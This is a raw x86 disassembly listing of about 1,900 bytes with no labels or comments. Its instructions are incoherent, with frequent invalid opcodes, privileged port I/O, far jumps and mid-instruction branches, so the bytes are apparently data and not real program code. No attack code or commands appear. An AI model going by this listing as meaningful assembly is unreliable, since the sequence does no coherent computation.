  415e17:	mov    ebp,0xa2deb093
  415e1c:	or     BYTE PTR [ecx],cl
  415e1e:	add    dl,ch
  415e20:	add    edi,ecx
  415e22:	aam    0x34
  415e24:	mov    eax,0xe0af7385
  415e29:	scas   eax,DWORD PTR es:[edi]
  415e2a:	nop
  415e2b:	arpl   WORD PTR [eax],ax
  415e2d:	arpl   WORD PTR gs:[ebx+0x16],sp
  415e31:	add    edx,ebx
  415e33:	test   al,0x81
  415e35:	add    edi,DWORD PTR [ecx]
  415e37:	out    dx,al
  415e38:	stos   DWORD PTR es:[edi],eax
  415e39:	imul   ebx,DWORD PTR [edi-0xe],0xbc8ff1e7
  415e40:	int3   
  415e41:	add    al,0xc1
  415e43:	xchg   bh,bh
  415e45:	sub    ch,BYTE PTR [eax]
  415e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e48:	fistp  QWORD PTR [eax+0x1b04d480]
  415e4e:	and    esi,eax
  415e50:	push   ebx
  415e51:	or     DWORD PTR [eax+edi*1],ebp
  415e54:	mov    cl,BYTE PTR [esi+eiz*8]
  415e57:	sbb    dl,BYTE PTR [ebp-0x723ca754]
  415e5d:	add    DWORD PTR [eax+0x4c],ebx
  415e60:	retf   0x266b
  415e63:	inc    eax
  415e64:	push   0x48880408
  415e69:	and    BYTE PTR [ebp-0x451adde4],0x48
  415e70:	inc    eax
  415e71:	je     0x415e20
  415e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e74:	test   al,0x6f
  415e76:	popa   
  415e77:	jp     0x415eac
  415e79:	cmp    eax,DWORD PTR [ecx-0x597f6976]
  415e7f:	je     0x415e6e
  415e81:	fcompp 
  415e83:	jge    0x415e92
  415e85:	adc    BYTE PTR [eax+eax*4+0x40],ch
  415e89:	stos   DWORD PTR es:[edi],eax
  415e8a:	shl    BYTE PTR [ebp-0x4a],1
  415e8d:	lahf   
  415e8e:	xchg   BYTE PTR [ebx+0x1850ce9b],dh
  415e94:	jmp    0x415ee0
  415e96:	sub    eax,0x45e681de
  415e9b:	les    esi,FWORD PTR [ebx-0x4a9d6398]
  415ea1:	cmc    
  415ea2:	(bad)  
  415ea3:	mov    ch,0x24
  415ea5:	fidiv  DWORD PTR [esi+0x6692a9a4]
  415eab:	add    al,0xe4
  415ead:	in     al,dx
  415eae:	mov    ah,0x5f
  415eb0:	iret   
  415eb1:	stc    
  415eb2:	aaa    
  415eb3:	in     eax,0xa4
  415eb5:	stos   BYTE PTR es:[edi],al
  415eb6:	loopne 0x415f31
  415eb8:	imul   BYTE PTR [eax+ebp*2]
  415ebb:	add    ecx,DWORD PTR [ebx]
  415ebd:	cmp    al,0xed
  415ebf:	aaa    
  415ec0:	push   ss
  415ec1:	repnz nop
  415ec3:	mov    ecx,0x66496978
  415ec8:	data16 mov dl,0xc4
  415ecb:	mov    cl,0x95
  415ecd:	push   cs
  415ece:	aaa    
  415ecf:	es jecxz 0x415e59
  415ed2:	xchg   ecx,eax
  415ed3:	pop    edx
  415ed4:	pop    esp
  415ed5:	out    0xed,al
  415ed7:	dec    edi
  415ed8:	jbe    0x415f2d
  415eda:	fldcw  WORD PTR [ebp+0x3e]
  415edd:	and    eax,0xbbb3be9a
  415ee2:	push   0xffffff9b
  415ee4:	rol    al,1
  415ee6:	dec    esp
  415ee7:	aaa    
  415ee8:	stc    
  415ee9:	test   al,0xf6
  415eeb:	stc    
  415eec:	inc    edi
  415eed:	add    ebp,DWORD PTR [edi-0x77fc2e76]
  415ef3:	add    BYTE PTR [ebx-0x7a],al
  415ef6:	inc    edi
  415ef7:	sub    al,0xe0
  415ef9:	pop    ds
  415efa:	ror    BYTE PTR [esi-0x734abd7a],cl
  415f00:	fistp  WORD PTR [esi-0x60930bc4]
  415f06:	xor    BYTE PTR [ecx+0x7a],ah
  415f09:	pop    edx
  415f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f0b:	dec    esp
  415f0c:	jnp    0x415f13
  415f0e:	jne    0x415e96
  415f10:	jp     0x415ed1
  415f12:	lea    ebp,[esi-0x424733ca]
  415f18:	mov    ah,0xf3
  415f1a:	call   0xf6e6:0xe34e7de6
  415f21:	fistp  DWORD PTR [esp+ebx*1-0x3f8fc0db]
  415f28:	mov    ebp,DWORD PTR ds:0x6ec180a5
  415f2e:	add    DWORD PTR [edx+0x42],esp
  415f31:	dec    ebx
  415f32:	pop    ebp
  415f33:	cmp    BYTE PTR [edi+0x20],cl
  415f36:	retf   
  415f37:	test   eax,0xc7e85c3
  415f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f3d:	xchg   esi,eax
  415f3e:	loop   0x415f4f
  415f40:	or     BYTE PTR [ebp+0x2060840],cl
  415f46:	shl    DWORD PTR [eax],1
  415f48:	mul    DWORD PTR [ebx-0x14cad518]
  415f4e:	push   ds
  415f4f:	jge    0x415ee6
  415f51:	pop    ebx
  415f52:	in     eax,0xcb
  415f54:	add    al,0x6e
  415f56:	pop    ss
  415f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f58:	or     al,ah
  415f5a:	mov    ebx,0xf115ed27
  415f5f:	or     ebx,DWORD PTR [eax+0x41]
  415f62:	xchg   edi,eax
  415f63:	fs mov dh,0x60
  415f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f67:	and    ch,BYTE PTR [ecx-0x4]
  415f6a:	into   
  415f6b:	stos   DWORD PTR es:[edi],eax
  415f6c:	jle    0x415f77
  415f6e:	ror    dl,0x7c
  415f71:	jmp    0x34bd:0x583e8bc2
  415f78:	int    0xfb
  415f7a:	out    0x5e,al
  415f7c:	test   BYTE PTR es:[ebx+0x4c49dcdf],bl
  415f83:	mov    esi,0x4d8a98fb
  415f88:	clc    
  415f89:	fcomi  st,st(4)
  415f8b:	push   esi
  415f8c:	out    dx,eax
  415f8d:	shl    bh,cl
  415f8f:	dec    ecx
  415f90:	out    dx,al
  415f91:	mov    ah,BYTE PTR [esi+0x76]
  415f94:	loopne 0x415fef
  415f96:	inc    ebp
  415f97:	add    DWORD PTR [eax+0x27],edx
  415f9a:	sbb    BYTE PTR [esi+0x2],bh
  415f9d:	and    eax,DWORD PTR [ecx]
  415f9f:	sar    eax,cl
  415fa1:	push   ecx
  415fa2:	pushf  
  415fa3:	xor    ah,ah
  415fa5:	inc    ecx
  415fa6:	inc    eax
  415fa7:	or     cl,BYTE PTR [esi+0x18]
  415faa:	ror    DWORD PTR [esi+0xa],cl
  415fad:	adc    eax,0xfe507031
  415fb2:	addr16 rcr bl,cl
  415fb5:	mov    ds:0x17a5db86,eax
  415fba:	lods   eax,DWORD PTR cs:[esi]
  415fbc:	and    eax,0xde60c42c
  415fc1:	mov    ds:0xc969eb10,eax
  415fc6:	fs stos DWORD PTR es:[edi],eax
  415fc8:	adc    BYTE PTR ds:0x22868516,0x99
  415fcf:	stos   DWORD PTR es:[edi],eax
  415fd0:	cld    
  415fd1:	stos   BYTE PTR es:[edi],al
  415fd2:	adc    ch,BYTE PTR ss:[ebx-0x3300fbd2]
  415fd9:	sub    eax,0x52122e5d
  415fde:	and    DWORD PTR [ebx+0x62],ecx
  415fe1:	mov    esi,0xef92cf15
  415fe6:	ins    BYTE PTR es:[edi],dx
  415fe7:	push   0x56
  415fe9:	or     al,0x63
  415feb:	and    ch,BYTE PTR [esi]
  415fed:	mov    ds:0xc57334db,eax
  415ff2:	loope  0x415fb4
  415ff4:	(bad)  
  415ff5:	adc    al,0x9e
  415ff7:	inc    edi
  415ff8:	div    BYTE PTR [eax]
  415ffa:	xchg   ebp,eax
  415ffb:	sbb    ch,BYTE PTR ds:0x36c3da20
  416001:	mov    DWORD PTR ds:0xac921fa0,esp
  416007:	gs mov ecx,0x4a397f9d
  41600d:	or     al,dh
  41600f:	cmp    eax,0x9c795b3e
  416014:	mov    cl,BYTE PTR [edx]
  416016:	dec    ebx
  416017:	ins    DWORD PTR es:[edi],dx
  416018:	jg     0x415ffb
  41601a:	adc    BYTE PTR [ecx+0x26],dh
  41601d:	rcr    dh,1
  41601f:	xchg   esi,eax
  416020:	cli    
  416021:	and    DWORD PTR ds:0x723cdc68,esi
  416027:	loop   0x415fc5
  416029:	int3   
  41602a:	or     DWORD PTR [esi-0x3d],edx
  41602d:	int3   
  41602e:	mov    bh,0x20
  416030:	ret    
  416031:	shl    BYTE PTR [ebx+0x32821fdd],cl
  416037:	mov    ecx,0x914cf7a8
  41603c:	retf   0xc72b
  41603f:	cld    
  416040:	call   0xdd5a4c83
  416045:	aas    
  416046:	ja     0x416082
  416048:	lods   eax,DWORD PTR ds:[esi]
  416049:	jge    0x415fd6
  41604b:	mov    ds:0x603e0061,eax
  416050:	xor    eax,0x73cab931
  416055:	add    al,0xa1
  416057:	cmp    al,0xc7
  416059:	shr    DWORD PTR [ebp-0x66],1
  41605c:	ja     0x4160a0
  41605e:	xchg   ebx,eax
  41605f:	ret    0xa7cb
  416062:	sbb    eax,0xe8a6e7eb
  416067:	stos   BYTE PTR es:[edi],al
  416068:	mov    eax,ds:0x270b90c5
  41606d:	arpl   bp,si
  41606f:	adc    al,0x7e
  416072:	adc    eax,0x55855a0d
  416077:	jl     0x416046
  416079:	mov    esi,0xf80ed846
  41607e:	les    edi,FWORD PTR [ebx+0x62180cbb]
  416084:	out    dx,al
  416085:	gs dec ebp
  416087:	iret   
  416088:	fistp  QWORD PTR es:[edx+0x14]
  41608c:	jno    0x416061
  41608e:	pusha  
  41608f:	sub    dl,BYTE PTR [edi+edi*1-0x70]
  416093:	xor    ecx,edi
  416095:	loope  0x416044
  416097:	add    eax,0xe9d9f27
  41609c:	sub    eax,0x65fc6850
  4160a1:	shl    edx,0xd0
  4160a4:	pop    edi
  4160a5:	adc    BYTE PTR [eax],cl
  4160a7:	mov    WORD PTR [eax-0x4a],ds
  4160aa:	jno    0x4160b7
  4160ac:	stc    
  4160ad:	aas    
  4160ae:	xor    esi,esp
  4160b0:	xchg   ebp,eax
  4160b1:	cdq    
  4160b2:	fs jmp 0x3bf6f997
  4160b8:	mov    ?,WORD PTR [edi]
  4160ba:	or     ch,bl
  4160bc:	aam    0xa4
  4160be:	aad    0xde
  4160c0:	ret    
  4160c1:	clc    
  4160c2:	ror    bl,cl
  4160c4:	jns    0x4160e0
  4160c6:	add    al,BYTE PTR [ebx-0x1f]
  4160c9:	fiadd  WORD PTR [eax-0x3034318]
  4160cf:	xchg   esi,eax
  4160d0:	mov    ah,0x8e
  4160d2:	xor    esi,esi
  4160d4:	mov    eax,ds:0xede84b80
  4160d9:	adc    DWORD PTR [esi],ebx
  4160db:	shl    BYTE PTR [ecx+0x40],1
  4160de:	aad    0x3d
  4160e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160e1:	icebp  
  4160e2:	ss jns 0x416156
  4160e5:	in     al,0x4
  4160e7:	test   DWORD PTR [edx-0x44e0609f],0x1968a0a
  4160f1:	dec    eax
  4160f2:	push   eax
  4160f3:	inc    esi
  4160f4:	(bad)  
  4160f5:	cli    
  4160f6:	pop    edi
  4160f7:	mov    bl,0x21
  4160f9:	pusha  
  4160fa:	mov    ch,0x7d
  4160fc:	int    0x9c
  4160fe:	fimul  DWORD PTR [ebx+edi*1]
  416101:	lds    esi,FWORD PTR [ebp-0x7411a2f6]
  416107:	mov    edi,0xc2e60522
  41610c:	stc    
  41610d:	push   es
  41610e:	xchg   edi,eax
  41610f:	retf   0x2ed0
  416112:	ins    DWORD PTR es:[edi],dx
  416113:	aaa    
  416114:	mov    esi,0xd6e698d
  416119:	pop    esp
  41611a:	ins    DWORD PTR es:[edi],dx
  41611b:	lods   eax,DWORD PTR ds:[esi]
  41611c:	jmp    0x4160be
  41611e:	adc    al,0x6a
  416120:	jge    0x41612f
  416122:	test   eax,0x125f60a5
  416127:	addr16 int 0x4f
  41612a:	cld    
  41612b:	test   al,0x14
  41612d:	out    dx,al
  41612e:	cdq    
  41612f:	jecxz  0x416121
  416131:	push   ebp
  416132:	xor    cl,BYTE PTR ds:0xd9ff746d
  416138:	dec    eax
  416139:	mov    cl,0xba
  41613b:	add    DWORD PTR [esp+edx*4+0x4bb8dfa7],esi
  416142:	hlt    
  416143:	sbb    BYTE PTR [ebp+0x20],cl
  416146:	test   DWORD PTR [ecx+edi*8],ebp
  416149:	and    BYTE PTR [ebp+0x33],bh
  41614c:	push   esi
  41614d:	int3   
  41614e:	fwait
  41614f:	popf   
  416150:	mov    bl,0x7d
  416152:	xchg   ebx,eax
  416153:	fidiv  DWORD PTR [ebp-0x4b7a4351]
  416159:	mov    ?,WORD PTR [ecx]
  41615b:	xchg   DWORD PTR ds:0x608210a1,ebp
  416161:	push   es
  416162:	push   edx
  416164:	cld    
  416165:	mov    edi,0xdaeba9c3
  41616a:	ja     0x416194
  41616c:	xor    DWORD PTR [ecx+0x73],esi
  41616f:	pop    esp
  416170:	cli    
  416171:	or     BYTE PTR [ecx-0x6d5b3c0a],bl
  416177:	(bad)  
  416178:	mov    esi,0xf7d55f07
  41617d:	(bad)  
  41617e:	comiss xmm6,xmm7
  416181:	mov    dl,0xad
  416183:	or     DWORD PTR [eax-0x2b],esi
  416186:	(bad)  
  416187:	(bad)  
  416188:	(bad)  
  416189:	jns    0x416110
  41618b:	mov    DWORD PTR [ebx],esp
  41618d:	mov    ds,ecx
  41618f:	xchg   ecx,eax
  416190:	ins    DWORD PTR es:[edi],dx
  416191:	jecxz  0x4161be
  416193:	sahf   
  416194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416195:	std    
  416196:	out    0xd,eax
  416198:	call   0xdb6b:0x536dc7ff
  41619f:	sar    BYTE PTR [edi],0x4d
  4161a2:	mov    ch,0x36
  4161a4:	dec    ebx
  4161a5:	les    eax,FWORD PTR [ebx+0x17]
  4161a8:	ror    BYTE PTR [ebp+0x308d58c6],1
  4161ae:	mov    ebp,DWORD PTR [eax+0x7b77635c]
  4161b4:	dec    ebx
  4161b5:	clc    
  4161b6:	xchg   ebp,eax
  4161b7:	add    al,bh
  4161b9:	mov    ah,0xc7
  4161bb:	cmp    eax,0xed60a735
  4161c0:	pop    edx
  4161c1:	ret    0x4945
  4161c4:	mov    WORD PTR [eax+0x33],cs
  4161c7:	pop    edi
  4161c8:	cld    
  4161c9:	sub    edx,DWORD PTR [edx-0x37cac8ae]
  4161cf:	test   BYTE PTR [ebp+0x531de1c],0xa
  4161d6:	jmp    0x41617c
  4161d8:	push   esi
  4161d9:	ss aas 
  4161db:	sbb    al,0x43
  4161dd:	pop    ebp
  4161de:	push   ebx
  4161df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161e0:	sbb    esp,DWORD PTR [esi]
  4161e2:	mov    BYTE PTR [edx+ecx*1],ch
  4161e5:	out    0x1,eax
  4161e7:	or     al,0x78
  4161e9:	out    0x3,al
  4161eb:	mov    ecx,0x7b974e24
  4161f0:	fwait
  4161f1:	adc    DWORD PTR [eax-0x3c],eax
  4161f4:	outs   dx,BYTE PTR ds:[esi]
  4161f5:	jb     0x416200
  4161f7:	inc    ebp
  4161f8:	arpl   WORD PTR [edi-0x62],ax
  4161fb:	addr16 jge 0x416222
  4161fe:	gs adc al,0x53
  416201:	ins    DWORD PTR es:[edi],dx
  416202:	jp     0x41619f
  416204:	sbb    BYTE PTR [edx],bh
  416206:	mov    ecx,0x4b160fc7
  41620b:	in     eax,0x48
  41620d:	sbb    al,0xbd
  41620f:	loope  0x416197
  416211:	ffreep st(7)
  416213:	jecxz  0x41625e
  416215:	ins    DWORD PTR es:[edi],dx
  416216:	div    edx
  416218:	sub    ah,0xa3
  41621b:	aam    0x14
  41621d:	(bad)  
  41621e:	out    0x36,al
  416220:	fild   DWORD PTR [ecx-0xa]
  416223:	(bad)  
  416224:	dec    ebp
  416225:	xchg   esi,eax
  416226:	enter  0xb92a,0x8
  41622a:	out    dx,al
  41622b:	popa   
  41622c:	fstp   QWORD PTR [ebp-0x1]
  41622f:	sbb    BYTE PTR [edi+0x3fe52202],dl
  416235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416236:	push   edi
  416237:	push   edi
  416238:	mov    eax,0x65f6cd12
  41623d:	dec    edx
  41623e:	xchg   ebx,eax
  41623f:	cs jecxz 0x416255
  416242:	jecxz  0x416210
  416244:	adc    ebx,esp
  416246:	ret    
  416247:	retf   0xe87b
  41624a:	mov    ebx,0xe039ef69
  41624f:	out    dx,al
  416250:	in     eax,dx
  416251:	cmove  esp,DWORD PTR [edx-0x6c0a0c0b]
  416258:	or     eax,0xff17f0b9
  41625d:	ror    BYTE PTR [ebx],1
  41625f:	jge    0x416255
  416261:	ds inc ebp
  416263:	sbb    dl,BYTE PTR [eax-0x8]
  416266:	retf   0x15be
  416269:	add    ah,BYTE PTR [ecx-0x3f59f28]
  41626f:	push   esi
  416270:	(bad)  
  416271:	push   ebx
  416272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416273:	mov    ah,0x1
  416275:	repz mov eax,0x9751545c
  41627b:	ins    DWORD PTR es:[edi],dx
  41627c:	mov    al,0x59
  41627e:	loop   0x416258
  416280:	outs   dx,DWORD PTR ds:[esi]
  416281:	popa   
  416282:	mov    BYTE PTR [esi+0x197880c8],al
  416288:	sbb    BYTE PTR [esi],bh
  41628a:	dec    ebx
  41628b:	mov    ch,0x94
  41628d:	imul   esi,esi,0x8674b061
  416293:	push   ss
  416294:	retf   0x42b9
  416297:	in     eax,dx
  416298:	in     al,dx
  416299:	adc    al,0xbb
  41629b:	or     al,0x38
  41629d:	push   edx
  41629e:	mov    esi,0x755ff542
  4162a3:	imul   ebx,DWORD PTR [ebp+0x628b541a],0xda8e2a6b
  4162ad:	call   0x9bb0fb7
  4162b2:	or     DWORD PTR [ebp+0x63],ebx
  4162b5:	mov    al,ds:0xc5c8aec5
  4162ba:	sar    DWORD PTR [edi+eax*4],cl
  4162bd:	dec    ebx
  4162be:	inc    ebx
  4162bf:	stos   DWORD PTR es:[edi],eax
  4162c0:	icebp  
  4162c1:	in     al,0x7d
  4162c3:	jg     0x4162d1
  4162c5:	pop    ebx
  4162c6:	repnz sbb BYTE PTR [ebp-0x64ded5eb],cl
  4162cd:	aas    
  4162ce:	push   edi
  4162cf:	aaa    
  4162d0:	sbb    eax,0xb91d5bdd
  4162d5:	push   esi
  4162d6:	mov    ?,edi
  4162d8:	fisttp DWORD PTR [ebp-0x78]
  4162db:	pop    edi
  4162dc:	ficomp DWORD PTR [ecx]
  4162de:	fisttp QWORD PTR [ebx]
  4162e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e1:	jp     0x4162ea
  4162e3:	push   0xfb6af5f8
  4162e8:	pop    ecx
  4162e9:	and    ebp,edi
  4162eb:	in     al,0xb7
  4162ed:	jne    0x4162e3
  4162ef:	cmp    dh,BYTE PTR [ebp+0x6280c934]
  4162f5:	cs jl  0x4162b1
  4162f8:	loope  0x4162e5
  4162fa:	mov    bl,0x66
  4162fc:	mov    esi,edi
  4162fe:	into   
  4162ff:	mov    dh,0xd7
  416301:	mov    esp,0xc6e15b6f
  416306:	jmp    0x416373
  416308:	aad    0xa4
  41630a:	aaa    
  41630b:	nop
  41630c:	and    edx,DWORD PTR [eax]
  41630e:	scas   al,BYTE PTR es:[edi]
  41630f:	xor    dh,dl
  416311:	lods   al,BYTE PTR ds:[esi]
  416312:	es and eax,0x8f338627
  416318:	mov    ah,0x8f
  41631a:	pop    ebx
  41631b:	cmp    al,0x3f
  41631d:	mov    ah,0x4f
  41631f:	jbe    0x416364
  416321:	sar    dh,1
  416323:	test   al,0xc8
  416325:	mov    bh,0x4a
  416327:	xchg   edx,eax
  416328:	repz shl BYTE PTR [ebx-0xb541219],1
  41632f:	pop    edi
  416330:	adc    eax,0xcc41842d
  416335:	push   esp
  416336:	mov    eax,0x960f8187
  41633b:	dec    esp
  41633c:	push   es
  41633d:	stos   DWORD PTR es:[edi],eax
  41633e:	pushf  
  41633f:	xor    al,0x52
  416341:	dec    esi
  416342:	jmp    0x4162fe
  416344:	jo     0x416371
  416346:	or     ah,BYTE PTR [ebp-0x4a]
  416349:	dec    ebx
  41634a:	(bad)  
  41634b:	xor    esi,edi
  41634d:	jecxz  0x416342
  41634f:	dec    ebp
  416350:	mov    al,0x0
  416352:	pop    ss
  416353:	mov    esp,0xecef5038
  416358:	dec    edi
  416359:	ror    BYTE PTR [edi],cl
  41635b:	test   DWORD PTR cs:[ebp-0x8],esp
  41635f:	pop    es
  416360:	cmp    cl,BYTE PTR [edi-0x737c5caa]
  416366:	bound  eax,QWORD PTR [ecx]
  416368:	mov    dl,0x5b
  41636a:	dec    edi
  41636b:	fsubr  QWORD PTR [ebp-0x5d083f77]
  416371:	stos   DWORD PTR es:[edi],eax
  416372:	or     dh,BYTE PTR [edx+edi*4]
  416375:	call   0xe73d:0xd574805a
  41637c:	mov    DWORD PTR [edx+0x1467f29f],0x20a6299f
  416386:	mov    ecx,0xfeaaf9cf
  41638b:	popa   
  41638c:	mov    bl,0xf
  41638e:	lods   al,BYTE PTR ds:[esi]
  41638f:	dec    edx
  416390:	pop    ebx
  416391:	imul   ebx,DWORD PTR ds:0x76d692ea,0xffffffe5
  416398:	xor    esp,DWORD PTR [ecx+0x2efd01a4]
  41639e:	xlat   BYTE PTR ds:[ebx]
  41639f:	jp     0x41641c
  4163a1:	out    0x41,eax
  4163a3:	mov    ebx,0xa31b6c35
  4163a8:	cs pop ecx
  4163aa:	test   al,0x36
  4163ac:	dec    edi
  4163ad:	in     al,0xeb
  4163af:	inc    esp
  4163b0:	dec    edi
  4163b1:	xor    DWORD PTR [ebx-0x59],0x6d
  4163b5:	sub    bl,BYTE PTR [ebx-0x14]
  4163b8:	rcr    edi,cl
  4163ba:	in     al,0x9e
  4163bc:	fcom   QWORD PTR ds:0x7b3583bf
  4163c2:	jnp    0x416351
  4163c4:	fwait
  4163c5:	retf   0xedf
  4163c8:	stos   BYTE PTR es:[edi],al
  4163c9:	rol    DWORD PTR [edi],0xed
  4163cc:	int3   
  4163cd:	popf   
  4163ce:	mov    WORD PTR [edx],cs
  4163d0:	xor    al,0x6a
  4163d2:	aam    0x19
  4163d4:	ins    DWORD PTR es:[edi],dx
  4163d5:	and    eax,0xf01cd615
  4163da:	mov    eax,ds:0x1cfa44d8
  4163df:	mov    ebx,0xe485066d
  4163e4:	scas   eax,DWORD PTR es:[edi]
  4163e5:	jl     0x416432
  4163e7:	xchg   DWORD PTR [esi-0x29],edi
  4163ea:	pop    ecx
  4163eb:	dec    edx
  4163ec:	sbb    al,0xb8
  4163ee:	xchg   esi,eax
  4163ef:	pop    esp
  4163f0:	push   ds
  4163f1:	test   ebx,0x77fdffe4
  4163f7:	jg     0x4163c3
  4163f9:	sbb    al,0x91
  4163fb:	and    al,0x4
  4163fd:	mov    ebp,0x6144d379
  416402:	aam    0xfe
  416404:	push   ebx
  416405:	mov    edi,0x109e507a
  41640a:	clc    
  41640b:	dec    ecx
  41640c:	stos   DWORD PTR es:[edi],eax
  41640d:	mov    cl,0x67
  41640f:	lds    edi,FWORD PTR [edx+ebx*2]
  416412:	test   BYTE PTR ds:0x25440dce,cl
  416418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41641a:	pushf  
  41641b:	out    0x49,al
  41641d:	ins    BYTE PTR es:[edi],dx
  41641e:	leave  
  41641f:	jnp    0x416429
  416421:	(bad)  
  416422:	pop    edx
  416423:	ins    DWORD PTR es:[edi],dx
  416424:	xor    dl,al
  416426:	test   edx,edi
  416428:	es pop ebp
  41642a:	mov    al,BYTE PTR [edx]
  41642c:	ja     0x4163f7
  41642e:	(bad)  
  41642f:	jbe    0x416404
  416431:	mov    esi,0xb5f67aea
  416436:	dec    eax
  416437:	mov    ah,0x4a
  416439:	lods   al,BYTE PTR ds:[esi]
  41643a:	push   ebp
  41643b:	mov    dl,0x2f
  41643d:	adc    ah,dh
  41643f:	js     0x41648d
  416441:	xchg   edi,eax
  416442:	push   eax
  416443:	nop
  416444:	outs   dx,BYTE PTR ds:[esi]
  416445:	jge    0x4163ca
  416447:	or     ebp,DWORD PTR [edi]
  416449:	xor    eax,0xcdf06cd1
  41644e:	jnp    0x416408
  416450:	cmp    DWORD PTR [ebp-0xe78c8b3],ecx
  416456:	jno    0x4164c0
  416458:	loope  0x41644d
  41645a:	out    dx,al
  41645b:	dec    ebp
  41645c:	test   BYTE PTR [edi-0xb],bh
  41645f:	clc    
  416460:	mov    gs,WORD PTR [eax-0x1]
  416463:	add    DWORD PTR [ebp-0x135a622e],0x6a
  41646a:	rol    al,0x6
  41646d:	aad    0x10
  41646f:	out    dx,eax
  416470:	sbb    ebp,edx
  416472:	shl    DWORD PTR [edi-0x71],cl
  416475:	ins    BYTE PTR es:[edi],dx
  416476:	adc    DWORD PTR [edi],0x48
  416479:	psubusw mm6,QWORD PTR [ecx*1+0x7e415a70]
  416481:	push   eax
  416482:	retf   
  416483:	iret   
  416484:	inc    eax
  416485:	fsubr  QWORD PTR [eax]
  416487:	mov    esp,0x6fe327d5
  41648c:	mov    ds:0x4c25419b,eax
  416491:	or     dl,bh
  416493:	push   cs
  416494:	mov    ds:0x502f3dc,al
  416499:	sub    al,BYTE PTR [eax+0x3b]
  41649c:	cwde   
  41649d:	push   edi
  41649e:	shl    BYTE PTR [ecx-0x457ec1f6],1
  4164a4:	cmp    esi,DWORD PTR [edi]
  4164a6:	mov    ch,0xfc
  4164a8:	fld    TBYTE PTR [eax]
  4164aa:	popa   
  4164ab:	fdivrp st(4),st
  4164ad:	mov    ah,0x2b
  4164af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164b0:	aas    
  4164b1:	test   al,0xd7
  4164b3:	xor    BYTE PTR [ecx+edi*4+0x3c8001c0],dh
  4164ba:	in     al,0x1
  4164bc:	adc    BYTE PTR [ecx+0x4917b8ef],bl
  4164c2:	mov    ebp,0x1f7dace8
  4164c7:	push   0xffffffc9
  4164c9:	mov    WORD PTR [ecx],?
  4164cb:	add    BYTE PTR [eax],0x60
  4164ce:	or     dh,ah
  4164d0:	loope  0x416480
  4164d2:	sti    
  4164d3:	clc    
  4164d4:	mov    ah,0xbe
  4164d6:	mov    BYTE PTR [ecx],ah
  4164d8:	xor    eax,0x73aa579
  4164dd:	imul   edi,DWORD PTR [ebp+0x2fd61374],0xfffffff1
  4164e4:	or     eax,0xc988b129
  4164e9:	inc    esp
  4164ea:	and    cl,BYTE PTR cs:[edx+0x41]
  4164ee:	or     ch,BYTE PTR [ebx]
  4164f0:	xor    al,0x6f
  4164f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164f3:	sti    
  4164f4:	(bad)  
  4164f5:	pop    esp
  4164f6:	es pop eax
  4164f8:	sub    al,0x1f
  4164fa:	add    BYTE PTR [esi+0x37],0x24
  4164fe:	xchg   ebp,eax
  4164ff:	add    DWORD PTR [ebx-0x49],ebp
  416502:	mov    al,ds:0x434daa4d
  416507:	jecxz  0x4164d8
  416509:	push   ebp
  41650a:	jno    0x41649b
  41650c:	cmc    
  41650d:	pushf  
  41650e:	mov    al,ds:0x51f5178c
  416513:	mov    bl,0x66
  416515:	jl     0x4164cb
  416517:	fdecstp 
  416519:	xor    DWORD PTR [eax-0x4ffb49b4],ebx
  41651f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416520:	cmp    dl,BYTE PTR [edx]
  416522:	test   BYTE PTR [ebx],0x11
  416525:	push   edx
  416526:	dec    edi
  416527:	sbb    eax,0xe6d5b728
  41652c:	adc    eax,0xf4a6d920
  416531:	cmp    DWORD PTR [ecx],edx
  416533:	test   DWORD PTR [ebp+0x133211eb],ebx
  416539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41653a:	lock test ch,bl
  41653d:	mov    esi,0xaad88cc
  416542:	daa    
  416543:	retf   
  416544:	frstor [ecx+0x422115e]
  41654a:	icebp  
  41654b:	nop
  41654c:	dec    edx
  41654d:	pop    edi
  41654e:	pop    ds
  41654f:	jae    0x4164d4
  416551:	(bad)  
  416552:	fsub   DWORD PTR [ecx-0x513502fc]
  416558:	clc    
  416559:	test   eax,0xb876ee3a
  41655e:	cmp    esi,eax
  416560:	(bad)  
  416561:	sbb    eax,0x59ab436f
  416566:	jae    0x416539
  416568:	into   
  416569:	jle    0x416596
  41656b:	jp     0x41650f
  41656d:	push   0x22
  41656f:	lods   al,BYTE PTR ds:[esi]
  416570:	adc    DWORD PTR [ebp+eax*2+0xd91f9dc],esi
  416577:	sbb    DWORD PTR [eax+0x2f71d4de],eax
  41657d:	sub    ebp,0xe93cccae
  416583:	pop    edx
  416584:	outs   dx,BYTE PTR ds:[esi]
  416585:	dec    ebp
  416586:	pushf  
  416587:	cmp    eax,0xba266a1f
  41658c:	retf   
  41658d:	out    dx,al
  41658e:	adc    BYTE PTR [eax-0x126e869d],ah
  416594:	xor    edi,DWORD PTR [edx-0x16321f77]
  41659a:	cld    
  41659b:	iret   
  41659c:	jo     0x4165df
  41659e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41659f:	sbb    ecx,DWORD PTR [ebx]
  4165a1:	fcom   DWORD PTR [ebp-0x1b]
  4165a4:	jnp    0x416541
  4165a6:	mov    al,0xea
  4165a8:	or     al,0xa1
  4165aa:	dec    ebp
  4165ab:	(bad)  
  4165ac:	jns    0x416601
  4165ae:	sar    DWORD PTR [ecx],cl
  4165b0:	mov    gs,eax
  4165b2:	push   es
  4165b3:	mov    ds:0xa010b476,al
  4165b8:	push   ecx
  4165b9:	rol    BYTE PTR [esi+0x5858ddd6],0xbb
  4165c0:	push   ecx
  4165c1:	ss mov eax,0xbdbc33f3
